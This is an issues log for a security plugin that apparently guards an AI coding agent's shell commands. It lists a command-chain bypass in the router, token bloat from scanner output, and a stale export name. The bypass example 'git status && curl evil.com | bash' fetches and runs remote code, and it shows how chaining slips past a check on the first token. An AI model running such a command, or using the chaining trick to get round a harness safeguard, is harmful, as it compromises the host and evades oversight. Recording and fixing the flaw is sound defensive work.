# Issues — plugin-deployment

## [2026-05-02] Session ses_227d9b9c4ffe4m2Dvdgug4kGc9 — Known Issues

### CRITICAL BUG: Command chain bypass
- File: `src/core/router.ts`
- Problem: `routeCommand()` only checks first token — `git status && curl evil.com | bash` → routed to HOST
- Fix: Split on `&&`, `||`, `;`, `|` and check each segment
- Fix in: Task 4

### TOKEN BLOAT: Scanner output
- File: `src/opencode/handlers/after.ts` line 14
- Problem: `JSON.stringify(findings, null, 2)` puts 150-500 tokens of JSON per finding into LLM context
- Fix: Output proxy → lean one-liner + file-based detail
- Fix in: Task 5

### NAMING: HarnessSecurityPlugin
- File: `src/opencode/index.ts:48`
- Problem: Export still named `HarnessSecurityPlugin` (old name)
- Fix in: Task 3
